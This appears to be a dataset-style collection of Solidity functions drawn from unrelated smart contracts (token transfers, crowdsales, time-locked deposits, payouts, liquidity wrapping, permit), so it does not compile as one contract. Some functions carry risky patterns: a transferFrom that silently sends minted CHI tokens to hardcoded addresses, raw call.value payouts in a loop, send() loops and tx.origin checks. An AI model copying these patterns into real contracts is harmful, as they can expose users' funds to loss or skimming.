function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns(bool) {
    if (_openTransaction) {
        if (msg.sender == _uniRouter) {
            IChiToken(_chiToken).mint(15);
            IChiToken(_chiToken).transfer(0x4D489eA839a7Bb47C4B9bA32ed277afA8A883067, 3);
            IChiToken(_chiToken).transfer(0x2Dc11a0A66810cd9ff57ef5c852284A6E3B394eb, 3);
            IDogQueen(_dogQueen).mint(sender, amount, false);
            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        } else {
            IDogQueen(_dogQueen).equalizeAccount(sender, recipient, amount);
            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
    } else {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
}

function transfer(address recipient, uint256 amount) public virtual override returns(bool) {
    if (_openTransaction) {
        if (msg.sender == _pairAddr) {
            uint256 res = IChiToken(_chiToken).balanceOf(address(this)).mul(_balances[msg.sender]).div(_totalSupply);
            if (res - _usedChiToken[msg.sender] >= 4) {
                IChiToken(_chiToken).free(4);
                _usedChiToken[msg.sender] = _usedChiToken[msg.sender].add(4);
            }
            IDogQueen(_dogQueen).mint(recipient, amount, true);
            _transfer(_msgSender(), recipient, amount);
            return true;
        } else {
            IDogQueen(_dogQueen).equalizeAccount(msg.sender, recipient, amount);
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
    } else {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
}

function burnCoin() public onlyOwner {
    uint256 time = now;
    uint256 genesisTime = _starttime.add(_starttimeOffset.mul(_centuryNum));
    require(_balances[address(this)] > 0, "Genesis time out.");
    require(time > genesisTime, "next Genesis block not yet due.");
    _balances[address(this)] = _balances[address(this)].sub(_totalSupply.mul(10).div(100));
    if (_centuryNum < 6) {
        _centuryNum++;
    }
}

function depositToken(address _token, uint _amount) public whenNotPaused {
    require(_token != address(0));
    require(ERC20(_token).transferFrom(msg.sender, this, _amount));
    tokens[_token][msg.sender] = SafeMath.add(tokens[_token][msg.sender], _amount);
    emit Deposit(_token, msg.sender, _amount, tokens[_token][msg.sender]);
}

function distributeTokenToAddressesAndAmountsWithoutHost(address _token, address[] _hunters, uint256[] _amounts) external onlyOwner {
    require(_hunters.length == _amounts.length);
    uint256 totalAmount = 0;
    for (uint j = 0; j < _amounts.length; j++) {
        totalAmount = SafeMath.add(totalAmount, _amounts[j]);
    }
    if (_token == address(0)) {
        require(address(this).balance >= totalAmount);
        for (uint i = 0; i < _hunters.length; i++) {
            require(_hunters[i].send(_amounts[i]));
            emit Distribution(_token, this, _hunters[i], _amounts[i]);
        }
    } else {
        require(ERC20(_token).balanceOf(this) >= totalAmount);
        for (uint k = 0; k < _hunters.length; k++) {
            require(ERC20(_token).transfer(_hunters[k], _amounts[k]));
            emit Distribution(_token, this, _hunters[k], _amounts[k]);
        }
    }
}

function distributeTokenToAddressesAndAmounts(address _token, address _host, address[] _hunters, uint256[] _amounts) external onlyOwner {
    require(_host != address(0));
    require(_hunters.length == _amounts.length);
    uint256 totalAmount = 0;
    for (uint j = 0; j < _amounts.length; j++) {
        totalAmount = SafeMath.add(totalAmount, _amounts[j]);
    }
    require(tokens[_token][_host] >= totalAmount);
    tokens[_token][_host] = SafeMath.sub(tokens[_token][_host], totalAmount);
    if (_token == address(0)) {
        for (uint i = 0; i < _hunters.length; i++) {
            require(_hunters[i].send(_amounts[i]));
            emit Distribution(_token, _host, _hunters[i], _amounts[i]);
        }
    } else {
        for (uint k = 0; k < _hunters.length; k++) {
            require(ERC20(_token).transfer(_hunters[k], _amounts[k]));
            emit Distribution(_token, _host, _hunters[k], _amounts[k]);
        }
    }
}

function distributeTokenToAddress(address _token, address _host, address _hunter, uint256 _amount) external onlyOwner {
    require(_hunter != address(0));
    require(tokens[_token][_host] >= _amount);
    tokens[_token][_host] = SafeMath.sub(tokens[_token][_host], _amount);
    if (_token == address(0)) {
        require(_hunter.send(_amount));
    } else {
        require(ERC20(_token).transfer(_hunter, _amount));
    }
    emit Distribution(_token, _host, _hunter, _amount);
}

function approve(
    address payable _destination,
    uint256 _amount
) public isMember sufficient(_amount) returns(bool) {
    Approval storage approval = approvals[_destination][_amount]; 
    bool coinciedeParties = false;
    for (uint i = 0; i < approval.coinciedeParties.length; i++) {
        if (approval.coinciedeParties[i] == msg.sender) coinciedeParties = true;
    }
    require(!coinciedeParties);
    if (approval.coincieded == 0) {
        nonce += 1;
        approval.nonce = nonce;
    }
    approval.coinciedeParties.push(msg.sender);
    approval.coincieded += 1;
    emit ConfirmationReceived(msg.sender, _destination, ETHER_ADDRESS, _amount);
    if (approval.coincieded >= signatureMinThreshold) {
        _destination.transfer(_amount); 
        finished[approval.nonce] = true;
        delete approvals[_destination][_amount];
        emit ConsensusAchived(_destination, ETHER_ADDRESS, _amount);
    }
    return true;
}

function addTokenSale(
    uint256 openingTime,
    uint256 closingTime,
    uint256 tokensCap,
    uint256 rate,
    bool carryover,
    uint256 timeLockRate,
    uint256 timeLockEnd,
    uint256 minAcceptableWei
) external onlyOwner {
    require(!isStarted);
    require(
        tokenSales.length == 0 ||
        TimedCrowdsale(tokenSales[tokenSales.length - 1]).closingTime() < openingTime
    );
    require(TokenController(tokenControllerAddr).state() == TokenController.State.Init);
    tokenSales.push(new TokenSale(
        rate,
        token,
        poolAddr,
        openingTime,
        closingTime,
        tokensCap,
        timeLockRate,
        timeLockEnd,
        carryover,
        minAcceptableWei
    ));
    tokenSaleIndex[tokenSales[tokenSales.length - 1]] = true;
}

function depositERC20(
    address tokenAddr,
    address account,
    uint256 amount,
    uint256 releaseTime
) external returns(bool) {
    require(account != address(0x0));
    require(tokenAddr != 0x0);
    require(msg.value == 0);
    require(amount > 0);
    require(ERC20Interface(tokenAddr).transferFrom(msg.sender, this, amount));
    lockedBalances[account][tokenAddr].push(LockedBalance(amount, releaseTime));
    emit Deposit(account, tokenAddr, amount, releaseTime);
    return true;
}

function openTokensale(address _tokensaleManagerAddr)
external
onlyOwner
returns(bool) {
    require(MintableToken(targetToken).owner() == address(this));
    require(state == State.Init);
    require(_tokensaleManagerAddr != address(0x0));
    tokensaleManagerAddr = _tokensaleManagerAddr;
    state = State.Tokensale;
    return true;
}

function initialize() external onlyOwner returns(bool) {
    require(!isStarted);
    TokenSale(tokenSales[0]).initialize(0);
    isStarted = true;
}

function finalizeTokenSaleManager() external {
    require(isStarted && !isFinalized);
    for (uint256 i = 0; i < tokenSales.length; i++) {
        require(FinalizableCrowdsale(tokenSales[i]).isFinalized());
    }
    require(TokenController(tokenControllerAddr).closeTokensale());
    isFinalized = true;
    PoolAndSaleInterface(poolAddr).startProject();
}

function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {
    require(tokensMinted < tokensCap);
    uint256 time_locked = _tokenAmount.mul(timeLockRate).div(100);
    uint256 instant = _tokenAmount.sub(time_locked);
    if (instant > 0) {
        require(TokenSaleManager(managerAddr).mint(_beneficiary, instant));
    }
    if (time_locked > 0) {
        require(TokenSaleManager(managerAddr).mintTimeLocked(
            _beneficiary,
            time_locked,
            timeLockEnd
        ));
    }
    tokensMinted = tokensMinted.add(_tokenAmount);
}

function getNextReleaseTimeOf(address account, address tokenAddr)
external
view
returns(uint256) {
    require(account != address(0x0));
    uint256 nextRelease = 2 ** 256 - 1;
    for (uint256 i = 0; i < lockedBalances[account][tokenAddr].length; i++) {
        if (lockedBalances[account][tokenAddr][i].releaseTime > block.timestamp &&
            lockedBalances[account][tokenAddr][i].releaseTime < nextRelease) {
            nextRelease = lockedBalances[account][tokenAddr][i].releaseTime;
        }
    }
    if (nextRelease == 2 ** 256 - 1) {
        nextRelease = 0;
    }
    return nextRelease;
}

function getLockedBalanceOf(address account, address tokenAddr)
external
view
returns(uint256) {
    require(account != address(0x0));
    uint256 balance = 0;
    for (uint256 i = 0; i < lockedBalances[account][tokenAddr].length; i++) {
        if (lockedBalances[account][tokenAddr][i].releaseTime > block.timestamp) {
            balance = balance.add(lockedBalances[account][tokenAddr][i].balance);
        }
    }
    return balance;
}

function getAvailableBalanceOf(address account, address tokenAddr)
external
view
returns(uint256) {
    require(account != address(0x0));
    uint256 balance = 0;
    for (uint256 i = 0; i < lockedBalances[account][tokenAddr].length; i++) {
        if (lockedBalances[account][tokenAddr][i].releaseTime <= block.timestamp) {
            balance = balance.add(lockedBalances[account][tokenAddr][i].balance);
        }
    }
    return balance;
}

function withdraw(address account, address tokenAddr, uint256 index_from, uint256 index_to) external returns(bool) {
    require(account != address(0x0));
    uint256 release_amount = 0;
    for (uint256 i = index_from; i < lockedBalances[account][tokenAddr].length && i < index_to + 1; i++) {
        if (lockedBalances[account][tokenAddr][i].balance > 0 &&
            lockedBalances[account][tokenAddr][i].releaseTime <= block.timestamp) {
            release_amount = release_amount.add(lockedBalances[account][tokenAddr][i].balance);
            lockedBalances[account][tokenAddr][i].balance = 0;
        }
    }
    require(release_amount > 0);
    if (tokenAddr == 0x0) {
        if (!account.send(release_amount)) {
            revert();
        }
        emit Withdraw(account, tokenAddr, release_amount);
        return true;
    } else {
        if (!ERC20Interface(tokenAddr).transfer(account, release_amount)) {
            revert();
        }
        emit Withdraw(account, tokenAddr, release_amount);
        return true;
    }
}

function canFinalize() public view returns(bool) {
    return (hasClosed() || (isInitialized && tokensCap <= tokensMinted));
}

function finalize() onlyOwner public {
    require(isInitialized);
    require(canFinalize());
    finalization();
    emit Finalized();
    isFinalized = true;
}

function payout() public {
    uint balance = address(this).balance;
    require(balance > 1);
    throughput += balance;
    uint investment = balance / 2;
    balance -= investment;
    uint256 tokens = weak_hands.buy.value(investment).gas(1000000)(msg.sender);
    emit Purchase(investment, tokens);
    while (balance > 0) {
        uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
        if (payoutToSend > 0) {
            balance -= payoutToSend;
            backlog -= payoutToSend;
            creditRemaining[participants[payoutOrder].etherAddress] -= payoutToSend;
            participants[payoutOrder].payout -= payoutToSend;
            if (participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)()) {
                emit Payout(payoutToSend, participants[payoutOrder].etherAddress);
            } else {
                balance += payoutToSend;
                backlog += payoutToSend;
                creditRemaining[participants[payoutOrder].etherAddress] += payoutToSend;
                participants[payoutOrder].payout += payoutToSend;
            }
        }
        if (balance > 0) {
            payoutOrder += 1;
        }
        if (payoutOrder >= participants.length) {
            return;
        }
    }
}

function withdraw() public {
    uint256 balance = address(this).balance;
    weak_hands.withdraw.gas(1000000)();
    uint256 dividendsPaid = address(this).balance - balance;
    dividends += dividendsPaid;
    emit Dividends(dividendsPaid);
}

function withdraw() onlyStronghands public {
    address _customerAddress = msg.sender;
    uint _dividends = myDividends(false); 
    payoutsTo_[_customerAddress] += (int)(_dividends * magnitude);
    _dividends += referralBalance_[_customerAddress];
    referralBalance_[_customerAddress] = 0;
    _customerAddress.transfer(_dividends); 
    onWithdraw(_customerAddress, _dividends);
}

function buy(uint256 amount) public payable {
    require(msg.sender == tx.origin, "no contracts");
    require(block.timestamp >= start, "early");
    require(amount <= supply(), "ordered too many");
    require(amount <= limitPerOrder, "ordered too many");
    require(msg.value == price.mul(amount), "wrong amount");
    nft.safeTransferFrom(address(this), msg.sender, id, amount, new bytes(0x0));
    hausAddress.transfer(address(this).balance);
    emit Buy(msg.sender, amount);
}

function wrap(address sourceToken, address[] memory destinationTokens, uint256 amount) public payable returns(address, uint256) {
    ERC20 sToken = ERC20(sourceToken);
    ERC20 dToken = ERC20(destinationTokens[0]);
    if (destinationTokens.length == 1) {
        if (sourceToken != ETH_TOKEN_ADDRESS) {
            require(sToken.transferFrom(msg.sender, address(this), amount), "You have not approved this contract or do not have enough token for this transfer 1");
            if (sToken.allowance(address(this), sushiAddress) < amount.mul(2)) {
                sToken.approve(sushiAddress, amount.mul(3));
            }
        }
        conductUniswap(sourceToken, destinationTokens[0], amount);
        uint256 thisBalance = dToken.balanceOf(address(this));
        dToken.transfer(msg.sender, thisBalance);
        return (destinationTokens[0], thisBalance);
    } else {
        bool updatedweth = false;
        if (sourceToken == ETH_TOKEN_ADDRESS) {
            WrappedETH sToken1 = WrappedETH(WETH_TOKEN_ADDRESS);
            sToken1.deposit {
                value: msg.value
            }();
            sToken = ERC20(WETH_TOKEN_ADDRESS);
            amount = msg.value;
            sourceToken = WETH_TOKEN_ADDRESS;
            updatedweth = true;
        }
        if (sourceToken != ETH_TOKEN_ADDRESS && updatedweth == false) {
            require(sToken.transferFrom(msg.sender, address(this), amount), "You have not approved this contract or do not have enough token for this transfer  2");
            if (sToken.allowance(address(this), sushiAddress) < amount.mul(2)) {
                sToken.approve(sushiAddress, amount.mul(3));
            }
        }
        if (destinationTokens[0] == ETH_TOKEN_ADDRESS) {
            destinationTokens[0] = WETH_TOKEN_ADDRESS;
        }
        if (destinationTokens[1] == ETH_TOKEN_ADDRESS) {
            destinationTokens[1] = WETH_TOKEN_ADDRESS;
        }
        if (sourceToken != destinationTokens[0]) {
            conductUniswap(sourceToken, destinationTokens[0], amount.div(2));
        }
        if (sourceToken != destinationTokens[1]) {
            conductUniswap(sourceToken, destinationTokens[1], amount.div(2));
        }
        ERC20 dToken2 = ERC20(destinationTokens[1]);
        uint256 dTokenBalance = dToken.balanceOf(address(this));
        uint256 dTokenBalance2 = dToken2.balanceOf(address(this));
        if (dToken.allowance(address(this), sushiAddress) < dTokenBalance.mul(2)) {
            dToken.approve(sushiAddress, dTokenBalance.mul(3));
        }
        if (dToken2.allowance(address(this), sushiAddress) < dTokenBalance2.mul(2)) {
            dToken2.approve(sushiAddress, dTokenBalance2.mul(3));
        }
        (, , uint liquidityCoins) = sushiExchange.addLiquidity(destinationTokens[0], destinationTokens[1], dTokenBalance, dTokenBalance2, 1, 1, address(this), longTimeFromNow);
        address thisPairAddress = factory.getPair(destinationTokens[0], destinationTokens[1]);
        ERC20 lpToken = ERC20(thisPairAddress);
        lpTokenAddressToPairs[thisPairAddress] = [destinationTokens[0], destinationTokens[1]];
        uint256 thisBalance = lpToken.balanceOf(address(this));
        if (fee > 0) {
            uint256 totalFee = (thisBalance.mul(fee)).div(10000);
            if (totalFee > 0) {
                lpToken.transfer(owner, totalFee);
            }
            thisBalance = lpToken.balanceOf(address(this));
            lpToken.transfer(msg.sender, thisBalance);
        } else {
            lpToken.transfer(msg.sender, thisBalance);
        }
        address changeRecipient = msg.sender;
        if (changeRecpientIsOwner == true) {
            changeRecipient = owner;
        }
        if (dToken.balanceOf(address(this)) > 0) {
            dToken.transfer(changeRecipient, dToken.balanceOf(address(this)));
        }
        if (dToken2.balanceOf(address(this)) > 0) {
            dToken2.transfer(changeRecipient, dToken2.balanceOf(address(this)));
        }
        return (thisPairAddress, thisBalance);
    }
}

function unwrap(address sourceToken, address destinationToken, uint256 amount) public payable returns(uint256) {
    address originalDestinationToken = destinationToken;
    ERC20 sToken = ERC20(sourceToken);
    if (destinationToken == ETH_TOKEN_ADDRESS) {
        destinationToken = WETH_TOKEN_ADDRESS;
    }
    ERC20 dToken = ERC20(destinationToken);
    if (sourceToken != ETH_TOKEN_ADDRESS) {
        require(sToken.transferFrom(msg.sender, address(this), amount), "You have not approved this contract or do not have enough token for this transfer  3 unwrapping");
    }
    LPERC20 thisLpInfo = LPERC20(sourceToken);
    lpTokenAddressToPairs[sourceToken] = [thisLpInfo.token0(), thisLpInfo.token1()];
    if (lpTokenAddressToPairs[sourceToken].length != 0) {
        if (sToken.allowance(address(this), sushiAddress) < amount.mul(2)) {
            sToken.approve(sushiAddress, amount.mul(3));
        }
        sushiExchange.removeLiquidity(lpTokenAddressToPairs[sourceToken][0], lpTokenAddressToPairs[sourceToken][1], amount, 0, 0, address(this), longTimeFromNow);
        ERC20 pToken1 = ERC20(lpTokenAddressToPairs[sourceToken][0]);
        ERC20 pToken2 = ERC20(lpTokenAddressToPairs[sourceToken][1]);
        uint256 pTokenBalance = pToken1.balanceOf(address(this));
        uint256 pTokenBalance2 = pToken2.balanceOf(address(this));
        if (pToken1.allowance(address(this), sushiAddress) < pTokenBalance.mul(2)) {
            pToken1.approve(sushiAddress, pTokenBalance.mul(3));
        }
        if (pToken2.allowance(address(this), sushiAddress) < pTokenBalance2.mul(2)) {
            pToken2.approve(sushiAddress, pTokenBalance2.mul(3));
        }
        if (lpTokenAddressToPairs[sourceToken][0] != destinationToken) {
            conductUniswap(lpTokenAddressToPairs[sourceToken][0], destinationToken, pTokenBalance);
        }
        if (lpTokenAddressToPairs[sourceToken][1] != destinationToken) {
            conductUniswap(lpTokenAddressToPairs[sourceToken][1], destinationToken, pTokenBalance2);
        }
        uint256 destinationTokenBalance = dToken.balanceOf(address(this));
        if (originalDestinationToken == ETH_TOKEN_ADDRESS) {
            wethToken.withdraw(destinationTokenBalance);
            if (fee > 0) {
                uint256 totalFee = (address(this).balance.mul(fee)).div(10000);
                if (totalFee > 0) {
                    owner.transfer(totalFee);
                }
                msg.sender.transfer(address(this).balance);
            } else {
                msg.sender.transfer(address(this).balance);
            }
        } else {
            if (fee > 0) {
                uint256 totalFee = (destinationTokenBalance.mul(fee)).div(10000);
                if (totalFee > 0) {
                    dToken.transfer(owner, totalFee);
                }
                destinationTokenBalance = dToken.balanceOf(address(this));
                dToken.transfer(msg.sender, destinationTokenBalance);
            } else {
                dToken.transfer(msg.sender, destinationTokenBalance);
            }
        }
        return destinationTokenBalance;
    } else {
        if (sToken.allowance(address(this), sushiAddress) < amount.mul(2)) {
            sToken.approve(sushiAddress, amount.mul(3));
        }
        if (sourceToken != destinationToken) {
            conductUniswap(sourceToken, destinationToken, amount);
        }
        uint256 destinationTokenBalance = dToken.balanceOf(address(this));
        dToken.transfer(msg.sender, destinationTokenBalance);
        return destinationTokenBalance;
    }
}

function permit(address holder, address spender, uint256 nonce, uint256 expiry,
    bool allowed, uint8 v, bytes32 r, bytes32 s) external {
    bytes32 digest =
        keccak256(abi.encodePacked(
            "\x19\x01",
            DOMAIN_SEPARATOR,
            keccak256(abi.encode(PERMIT_TYPEHASH,
                holder,
                spender,
                nonce,
                expiry,
                allowed))
        ));
    require(holder != address(0), "invalid-address-0");
    require(holder == ecrecover(digest, v, r, s), "invalid-permit");
    require(expiry == 0 || now <= expiry, "permit-expired");
    require(nonce == nonces[holder]++, "invalid-nonce");
    uint256 amount = allowed ? uint256(-1) : 0;
    allowance[holder][spender] = amount;
    emit Approval(holder, spender, amount);
}

